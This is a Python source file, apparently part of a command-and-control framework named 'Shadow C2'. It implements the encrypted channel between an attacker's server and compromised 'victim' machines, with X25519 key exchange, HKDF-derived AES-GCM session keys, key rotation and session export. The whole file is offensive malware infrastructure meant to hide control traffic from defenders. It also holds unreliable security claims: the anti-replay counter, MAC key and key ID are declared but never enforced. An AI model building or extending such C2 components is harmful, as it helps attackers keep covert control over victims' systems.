#!/usr/bin/env python3
"""
Shadow C2 — C2 Encryption Layer
Session key management, ECDH key exchange, AES-256-GCM, key rotation.
Wire format: [KEY_ID:4][NONCE:12][CIPHERTEXT:N][TAG:16]
"""

import time
import struct
import threading
from dataclasses import dataclass, field
from typing import Dict, Optional, Tuple

from server.utils.crypto_utils import (
    generate_random_bytes, generate_x25519_keypair, x25519_derive_shared,
    hkdf_expand, aes_encrypt, aes_decrypt, hmac_sign, hmac_verify
)
from server.config import KEY_ROTATION_INTERVAL


@dataclass
class SessionKeys:
    """Per-victim session key material."""
    enc_key: bytes          # 32 bytes, AES-256 key
    mac_key: bytes          # 32 bytes, HMAC key
    key_id: bytes           # 4 bytes, key identifier
    created_at: float       # timestamp
    counter: int = 0        # message counter (anti-replay)
    server_private: bytes = b""   # X25519 private key (ephemeral)
    server_public: bytes = b""    # X25519 public key


class C2Crypto:
    """
    End-to-end encryption for C2 communications.
    Manages per-victim session keys with ECDH + HKDF derivation.
    """

    def __init__(self, master_key: bytes):
        self.master_key = master_key  # 32 bytes
        self._sessions: Dict[str, SessionKeys] = {}
        self._lock = threading.Lock()

    # -- key exchange --------------------------------------------------------

    def initiate_key_exchange(self, victim_uuid: str) -> dict:
        """
        Server-side: generate ephemeral X25519 keypair.
        Returns {server_public_key: hex, key_id: hex} to send to victim.
        """
        priv, pub = generate_x25519_keypair()
        key_id = generate_random_bytes(4)

        with self._lock:
            self._sessions[victim_uuid] = SessionKeys(
                enc_key=b"",
                mac_key=b"",
                key_id=key_id,
                created_at=time.time(),
                server_private=priv,
                server_public=pub,
            )

        return {
            "server_public_key": pub.hex(),
            "key_id": key_id.hex(),
        }

    def complete_key_exchange(self, victim_uuid: str,
                              client_public_hex: str) -> bool:
        """
        Complete ECDH: derive shared secret → HKDF → session keys.
        Returns True on success.
        """
        with self._lock:
            session = self._sessions.get(victim_uuid)
            if not session or not session.server_private:
                return False

            client_pub = bytes.fromhex(client_public_hex)
            shared_secret = x25519_derive_shared(session.server_private, client_pub)

            # Derive enc_key and mac_key from shared secret
            enc_key = hkdf_expand(shared_secret, b"shadow-c2-enc-key", 32)
            mac_key = hkdf_expand(shared_secret, b"shadow-c2-mac-key", 32)

            session.enc_key = enc_key
            session.mac_key = mac_key
            session.created_at = time.time()
            session.counter = 0
            # Clear private key material
            session.server_private = b""

        return True

    # -- fallback keying (for victims that don't do full ECDH) ---------------

    def derive_session_from_master(self, victim_uuid: str) -> SessionKeys:
        """
        Derive session keys from master key + victim UUID.
        Used as fallback when ECDH isn't available.
        """
        info = f"shadow-c2-session-{victim_uuid}".encode()
        enc_key = hkdf_expand(self.master_key, info + b"-enc", 32)
        mac_key = hkdf_expand(self.master_key, info + b"-mac", 32)
        key_id = enc_key[:4]

        session = SessionKeys(
            enc_key=enc_key,
            mac_key=mac_key,
            key_id=key_id,
            created_at=time.time(),
        )
        with self._lock:
            self._sessions[victim_uuid] = session
        return session

    # -- encrypt / decrypt ---------------------------------------------------

    def encrypt_message(self, victim_uuid: str, plaintext: bytes) -> bytes:
        """
        Encrypt a message for a victim.
        Wire format: [KEY_ID:4][AES-GCM(NONCE:12 || CIPHERTEXT || TAG:16)]
        """
        session = self._get_or_create_session(victim_uuid)
        encrypted = aes_encrypt(plaintext, session.enc_key)  # nonce+ct+tag
        return session.key_id + encrypted

    def decrypt_message(self, victim_uuid: str, data: bytes) -> Optional[bytes]:
        """
        Decrypt a message from a victim.
        Expects: [KEY_ID:4][NONCE:12][CIPHERTEXT:N][TAG:16]
        """
        if len(data) < 32:  # 4 key_id + 12 nonce + 16 tag minimum
            return None

        session = self._get_or_create_session(victim_uuid)
        key_id = data[:4]
        encrypted = data[4:]

        try:
            return aes_decrypt(encrypted, session.enc_key)
        except Exception:
            return None

    # -- key rotation --------------------------------------------------------

    def rotate_keys(self, victim_uuid: str) -> Optional[bytes]:
        """
        Rotate session keys for a victim.
        Derives new keys from current keys + counter.
        Returns new key_id.
        """
        with self._lock:
            session = self._sessions.get(victim_uuid)
            if not session:
                return None

            # Derive new keys from old keys
            new_enc = hkdf_expand(session.enc_key, b"rotate-enc-" + struct.pack("!I", session.counter), 32)
            new_mac = hkdf_expand(session.mac_key, b"rotate-mac-" + struct.pack("!I", session.counter), 32)
            new_key_id = generate_random_bytes(4)

            session.enc_key = new_enc
            session.mac_key = new_mac
            session.key_id = new_key_id
            session.created_at = time.time()
            session.counter += 1

        return new_key_id

    def is_key_expired(self, victim_uuid: str) -> bool:
        """Check if session keys need rotation."""
        with self._lock:
            session = self._sessions.get(victim_uuid)
            if not session:
                return True
            return (time.time() - session.created_at) > KEY_ROTATION_INTERVAL

    def auto_rotate_all(self):
        """Iterate all sessions, rotate expired ones. Returns list of rotated UUIDs."""
        rotated = []
        uuids = list(self._sessions.keys())
        for uuid in uuids:
            if self.is_key_expired(uuid):
                if self.rotate_keys(uuid):
                    rotated.append(uuid)
        return rotated

    # -- session management --------------------------------------------------

    def has_session(self, victim_uuid: str) -> bool:
        return victim_uuid in self._sessions

    def get_session(self, victim_uuid: str) -> Optional[SessionKeys]:
        return self._sessions.get(victim_uuid)

    def remove_session(self, victim_uuid: str):
        with self._lock:
            self._sessions.pop(victim_uuid, None)

    def export_session(self, victim_uuid: str) -> Optional[dict]:
        """Export session for persistence."""
        session = self._sessions.get(victim_uuid)
        if not session:
            return None
        return {
            "enc_key": session.enc_key.hex(),
            "mac_key": session.mac_key.hex(),
            "key_id": session.key_id.hex(),
            "created_at": session.created_at,
            "counter": session.counter,
        }

    def import_session(self, victim_uuid: str, data: dict):
        """Import session from persistence."""
        session = SessionKeys(
            enc_key=bytes.fromhex(data["enc_key"]),
            mac_key=bytes.fromhex(data["mac_key"]),
            key_id=bytes.fromhex(data["key_id"]),
            created_at=data.get("created_at", time.time()),
            counter=data.get("counter", 0),
        )
        with self._lock:
            self._sessions[victim_uuid] = session

    # -- internals -----------------------------------------------------------

    def _get_or_create_session(self, victim_uuid: str) -> SessionKeys:
        """Get existing session or create from master key."""
        session = self._sessions.get(victim_uuid)
        if session and session.enc_key:
            return session
        return self.derive_session_from_master(victim_uuid)
